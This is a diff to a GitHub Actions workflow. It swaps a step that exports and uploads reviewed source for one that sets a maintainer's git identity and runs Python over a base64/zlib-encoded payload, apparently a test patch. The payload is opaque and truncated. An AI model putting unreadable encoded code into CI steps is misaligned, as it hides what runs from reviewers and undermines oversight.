@@ -5,24 +5,27 @@ on:
 permissions:
   contents: read
 jobs:
-  workspace:
+  baseline:
     runs-on: ubuntu-latest
-    timeout-minutes: 10
+    timeout-minutes: 15
     steps:
       - uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803
         with:
           ref: 9ed59304eec0a092a58c617c8370e62eab1c5935
           fetch-depth: 0
           persist-credentials: false
-      - name: Export exact reviewed source without credentials
+      - uses: actions/setup-dotnet@26b0ec14cb23fa6904739307f278c14f94c95bf1
+        with:
+          dotnet-version: |
+            8.0.x
+            10.0.x
+      - name: Apply exact reviewed regression-test patch
         run: |
           test "$(git rev-parse HEAD)" = 9ed59304eec0a092a58c617c8370e62eab1c5935
-          mkdir -p /tmp/pr-308-audit
-          git bundle create /tmp/pr-308-audit/source.bundle HEAD
-          git log -1 --format=fuller > /tmp/pr-308-audit/commit.txt
-      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02
-        with:
-          name: pr-308-source
-          path: /tmp/pr-308-audit
-          retention-days: 3
-          if-no-files-found: error
+          git config user.name 'Blake Niemyjski'
+          git config user.email 'bniemyjski@gmail.com'
+          mkdir -p /tmp/pr308-validation/baseline
+          python - <<'PY'
+          import base64, hashlib, pathlib, subprocess, zlib
+          payload = 'eNrtWlFT2zgQfvev0OXJmTiuYyAttKWlEK7ctMBB7vrQ6TCKrSQ6HCmVZGimx3+/lWQnduIEQrnetIcHJo4s7a5Wu98nr3Io+Ai1w+3e06Adku2g92xrqxVvhnHYDqKNdu8p3u63CQ5a/WfPNtF7ztA5GaPWUxQEO+YPhUHQcg5BzA56k+BLgo4pGU3+kpcUveix/P71YIRp4kd8tOscYEV2UDclHgpDIy8MwjZqbe5stXc2tlEjgMs5T3t/kUjtoI+ne939t5+QIhK+RfyKCJTQK4KiVEgukCRSUjBMEEmURJjFcKsEJdJxms2mg3zff3JOsIiGe31FxBn5nIKoLvxLP5Jo7vobtbYD1Fi4HNRCfZqA2iFmAxJ7ph9lkggF6qXbqDtOTPt91GwOqEL4iTZYPjnkKYsxdPHPyJhLqrg2ze8kWCoaSWOXb4xZZWTvIaU5lMXkC9reivpB2PL9zVYY9DdC1AqC9uamdtrDWu+A+x54Bq9fo2Z7a8Nro4b+aG23ETSN015CI4gInJAYRSBSoiVCnOmC70m9hH7nc4oTt/bkwppQ82Btr/glEX42TH5sffJPsRrWn9vBNw5yGvrmY3dIuJh8yr4dsYQyAlGO3VpMJe4lBKT1cSJJfXUfJdLqLmNOmWpS1lR0tFrYfM+lIiFdFBZqpbBZn+Vi9HI2Id3GqyUVuxWFZUuG5YRFqIvlJTomX9QpHpA93XTxYUjYO8j2c5vlR/JMp/nFGdHgID9QNeSp2tcpSdngZGxTUYIiNsgy1UM9zhNkZnJMrm081K32r/ZDX6nUQ66wyNcdvUSMXKNzlfaObItLWGz8i17uol+JOtX3R6wLngarxqCZTLt4SM8hb65DzFRoijjr00EqdDqwgr79Yrub2VMtwqayHXqk718cg5diwhRVkwMepSO43XVLmjxU07nYNGNr1XJFnpyTgl3TjJ24ZmxxqB7Erf+zEft8NAI0zhal2q66r930jo6oclt1v5Cs0A62uPMqxtAd5ONrDBg7M9I/BINMxLha9czQ31MiJkt0e7nBRSUZHHQhRl2tzH+L5XsuSLGPja9XSMG66HUz/SAgCuZ39SNj/WyYCd1CMLuZei+L1KIK2kduZcjm18N7oKCcackW9WB680Do70M2q+fl/sDGAoSe2vXJxGqn6JaFZcy4u9Sx4L3FZZ+l2pz02YNzBRuL0kjro3xFh4JfS+OhF8Ynf+KEGiZinS8RMSJ3Xbeuk9ssaAmI3HrZRSXWyH3lLXFVRXzZgQWneYs+qxh2jkfEtc7zlvpu2biCE73VPlxqcMuzvtEGrps1JUEmdbwVmZOPvMm9fgeWvQMjruS526hrHdJ6Q/owfxNoJu9lIfFz+rJ97Nw12JV465GiHpqiDEzhJNGYFhTaCyBaWDV/L47fAn8l4FX3wkNYDKQGh9m4r2VE1pDdaFgFVKJwDrArGUAL9U+W04A1T6WCmTgDOBmNE6JIrL8V+t38jFS8Fs2uy10/EEt8f9DVV04Qi4Fgt/l3iJAMV+Fd7Dvs2Ka+mmpd5rDycqAGat22JD8qCZnFWc1BJ4LC2uEEOqSJko8c9O9yUCEBZouzNtU88shDv9L9T2jjDkBm0H1FLSd7vqwipNtXjLaP6R....'
+          PY
